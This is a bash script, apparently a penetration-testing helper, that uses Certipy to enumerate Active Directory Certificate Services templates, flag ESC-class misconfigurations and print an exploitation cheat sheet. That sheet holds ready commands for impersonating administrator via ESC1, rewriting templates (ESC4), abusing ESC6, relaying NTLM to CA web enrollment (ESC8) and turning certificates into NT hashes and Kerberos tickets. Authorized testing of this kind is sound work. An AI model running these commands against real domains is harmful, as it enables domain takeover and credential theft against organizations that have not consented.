#!/usr/bin/env bash
#
# adcs-hunt.sh - Active Directory Certificate Services (ADCS) attack finder
# -----------------------------------------------------------------------------
# Uses Certipy to locate AD CS misconfigurations (the ESC1-ESC16 family) that
# allow privilege escalation / domain takeover via certificate abuse:
#   1. Enumerate CAs and certificate templates.
#   2. Flag VULNERABLE templates (-vulnerable) and save JSON + text.
#   3. Summarise which ESC class each finding maps to and the next command to
#      run for exploitation (request a cert, then auth with it).
#
# Requires any valid domain credential (ADCS enrollment data is authenticated).
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: domains you own or are explicitly permitted to test.
# Requesting certificates / authenticating as other principals is intrusive.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./adcs-hunt.sh -d <domain> -i <dc_ip> -u <user> -p <pass> [-H lm:nt] [-o out]
#
# EXAMPLES:
#   ./adcs-hunt.sh -d corp.local -i 10.10.10.10 -u jdoe -p 'P@ssw0rd'
#   ./adcs-hunt.sh -d corp.local -i 10.10.10.10 -u jdoe -H :aad3b4...
#
# DEPENDENCIES:
#   certipy (certipy-ad)   - required
#   jq                     - optional (prettier summary)
# -----------------------------------------------------------------------------

set -euo pipefail

c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

DOMAIN="" DC_IP="" USER="" PASS="" HASH="" OUT=""
usage(){ sed -n '2,30p' "$0"; exit 1; }
while getopts "d:i:u:p:H:o:h" o; do case "$o" in
  d) DOMAIN=$OPTARG;; i) DC_IP=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;;
  H) HASH=$OPTARG;; o) OUT=$OPTARG;; *) usage;;
esac; done
[ -z "$DOMAIN$DC_IP$USER" ] && usage
[ -z "$DOMAIN" ] || [ -z "$DC_IP" ] || [ -z "$USER" ] && { c_err "need -d, -i and -u"; usage; }
have certipy || { c_err "certipy not installed (pipx install certipy-ad)"; exit 1; }

OUT=${OUT:-"./adcs_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"}; mkdir -p "$OUT"; cd "$OUT"

CERTAUTH=( -u "$USER@$DOMAIN" -dc-ip "$DC_IP" )
[ -n "$HASH" ] && CERTAUTH+=( -hashes "$HASH" ) || CERTAUTH+=( -p "$PASS" )

c_step "Certipy: enumerate + flag vulnerable templates"
certipy find "${CERTAUTH[@]}" -vulnerable -stdout 2>&1 | tee certipy_vuln.txt || c_warn "certipy find -vulnerable failed"
c_info "Full enumeration (all templates) -> JSON/text..."
certipy find "${CERTAUTH[@]}" -output certipy_all 2>&1 | tail -4 || true

c_step "Findings summary"
if grep -qiE '\[!\] Vulnerabilities' certipy_vuln.txt 2>/dev/null; then
  grep -iE 'Template Name|\[!\]|ESC[0-9]+|Certificate Authorities|CA Name' certipy_vuln.txt | sed 's/^/   /'
  c_ok "Vulnerable template(s) found - see exploitation hints below."
else
  c_warn "No clearly-vulnerable templates flagged. Review certipy_all.json manually for edge cases."
fi

cat <<'HINTS'

------------------------------------------------------------------------------
ESC exploitation quick-reference (run from this dir; replace placeholders):

 ESC1  (template allows requester-supplied SAN -> impersonate anyone):
   certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target DC_IP \
        -template VULN_TEMPLATE -upn administrator@DOMAIN
   certipy auth -pfx administrator.pfx -dc-ip DC_IP        # -> NT hash / TGT

 ESC4  (you have write rights over a template -> make it ESC1):
   certipy template -u USER@DOMAIN -p PASS -template VULN_TEMPLATE -save-old
   # then exploit as ESC1, then restore with -configuration old config

 ESC6  (CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN on any template):
   certipy req ... -template User -upn administrator@DOMAIN

 ESC8  (NTLM relay to CA web enrollment -> see coerce-relay.sh):
   certipy relay -target 'http://CA_HOST/certsrv/certfnsh.asp' -template DomainController
   # then coerce a DC with coerce-relay.sh to feed the relay

 Use the recovered .pfx:
   certipy auth -pfx out.pfx -dc-ip DC_IP        # prints NT hash + Kerberos TGT
------------------------------------------------------------------------------
HINTS

c_step "DONE"
c_ok "Results under: $(pwd)  (certipy_vuln.txt, certipy_all.json)"
